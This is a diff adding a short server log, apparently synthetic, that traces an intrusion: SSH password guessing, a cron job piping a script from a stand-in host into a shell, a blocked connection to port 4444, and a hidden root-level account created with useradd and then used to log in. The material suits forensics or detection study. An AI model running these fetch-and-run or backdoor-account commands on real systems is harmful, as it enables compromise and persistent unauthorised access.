@@ -1,0 +1,15 @@
+Feb 11 03:14:22 srv-app-01 sshd[2841]: Failed password for invalid user admin from 203.0.113.47 port 51422 ssh2
+Feb 11 03:14:25 srv-app-01 sshd[2843]: Failed password for invalid user root from 203.0.113.47 port 51438 ssh2
+Feb 11 03:14:29 srv-app-01 sshd[2847]: Failed password for invalid user oracle from 203.0.113.47 port 51455 ssh2
+Feb 11 03:15:02 srv-app-01 sshd[2851]: Accepted password for svc_backup from 198.51.100.12 port 49188 ssh2
+Feb 11 03:16:41 srv-app-01 CRON[2902]: (svc_backup) CMD (curl -s http://update-crm-sync.example-cdn.net/p.sh | sh)
+Feb 11 03:16:44 srv-app-01 named[1122]: client 198.51.100.12#33122: query: update-crm-sync.example-cdn.net IN A
+Feb 11 03:17:03 srv-app-01 kernel: [UFW BLOCK] SRC=198.51.100.12 DST=203.0.113.90 PROTO=TCP DPT=4444
+Feb 11 03:18:12 srv-app-01 sshd[2960]: Connection from 192.0.2.181 port 40122
+Feb 11 03:18:30 srv-app-01 named[1122]: client 192.0.2.181#41055: query: static-metrics-cdn.example-cdn.net IN A
+Feb 11 03:22:07 srv-app-01 auditd[1401]: USER_CMD pid=3011 uid=0 cmd="useradd -o -u 0 -g 0 sysmon_svc"
+Feb 11 03:22:11 srv-app-01 auditd[1401]: ADD_USER id=0 acct="sysmon_svc" res=success
+Feb 11 03:24:55 srv-app-01 sshd[3080]: Accepted publickey for sysmon_svc from 192.0.2.181 port 40190 ssh2
+Feb 11 03:31:18 srv-app-01 kernel: [UFW BLOCK] SRC=203.0.113.90 DST=192.0.2.181 LEN=1480 PROTO=TCP DPT=443
+Feb 11 03:47:02 srv-app-01 systemd[1]: Started Session 44 of user sysmon_svc.
+Feb 11 04:02:39 srv-app-01 rsyslogd: action 'action-2' suspended, next retry in 30 seconds
